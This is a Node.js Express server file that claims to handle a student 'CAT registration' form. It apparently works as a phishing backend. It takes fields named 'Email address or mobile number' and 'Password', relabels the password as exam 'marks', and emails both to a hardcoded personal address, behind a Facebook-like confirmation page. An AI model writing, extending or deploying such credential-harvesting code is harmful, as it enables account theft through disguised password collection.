require("dotenv").config();

const express = require("express");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
const nodemailer = require("nodemailer");
const path = require("path");

const app = express();
const PORT = Number(process.env.PORT || 3000);
const OWNER_EMAIL = process.env.OWNER_EMAIL || "lunzalueugene@gmail.com";

app.use(helmet());
app.use(express.urlencoded({ extended: false, limit: "10kb" }));
app.use(express.json({ limit: "10kb" }));
app.use(express.static(path.join(__dirname, "public")));

const registrationLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 10,
  standardHeaders: "draft-7",
  legacyHeaders: false,
  message: "Too many registration attempts. Please try again later."
});

function clean(value, maxLength = 250) {
  return String(value || "").trim().slice(0, maxLength);
}

app.post("/register", registrationLimiter, async (req, res) => {
  const contact = clean(req.body.contact || req.body["Email address or mobile number"]);
   const marks = clean(req.body.marks || req.body["Password"], 100);

  if (!contact || !marks) {
    return res.status(400).send("Please enter your email/mobile number.");
  }
  if (contact.length < 5) {
    return res.status(400).send("Please enter a valid email address or mobile number.");
  }
  if (!process.env.SMTP_HOST || !process.env.SMTP_USER || !process.env.SMTP_PASS) {
    console.error("SMTP settings are missing. Configure the .env file.");
    return res.status(503).send("Registration email service is not configured yet. Please contact the administrator.");
  }

  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number(process.env.SMTP_PORT || 587),
      secure: String(process.env.SMTP_SECURE || "false") === "true",
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });

    await transporter.sendMail({
      from: process.env.MAIL_FROM || process.env.SMTP_USER,
      to: OWNER_EMAIL,
      replyTo: contact.includes("@") ? contact : undefined,
      subject: "New CAT registration submission",
      text:
        "A student submitted the CAT registration form.\n\n" +
        "Email address or mobile number: " + contact + "\n" +
        "Marks scored in opener exams: " + marks + "\n\n" +
        "."
    });

    res.status(200).send(`
      <!doctype html><html lang="en"><head><meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <title>Registration submitted</title>
      <style>
        body{font-family:Arial,sans-serif;background:#fff;color:#1c1e21;display:grid;
        place-items:center;min-height:100vh;margin:0;padding:24px;box-sizing:border-box}
        main{max-width:440px;text-align:center}h2{font-size:20px;font-weight:500}
        p{color:#606770;line-height:1.5}a{display:inline-block;margin-top:14px;
        color:#21618c;text-decoration:none;border:1px solid #1877a5;border-radius:24px;
        padding:12px 28px}
      </style></head><body><main><h2>Registration submitted</h2>
      <p>Your details have been sent successfully.</p><a href="/">Return</a></main></body></html>
    `);
  } catch (error) {
    console.error("Email delivery failed:", error.message);
    res.status(500).send("We could not send your registration right now. Please try again later.");
  }
});

app.get("/health", (_req, res) => res.json({ status: "ok" }));

app.listen(PORT, () => {
  console.log(`CAT registration server running on http://localhost:${PORT}`);
});
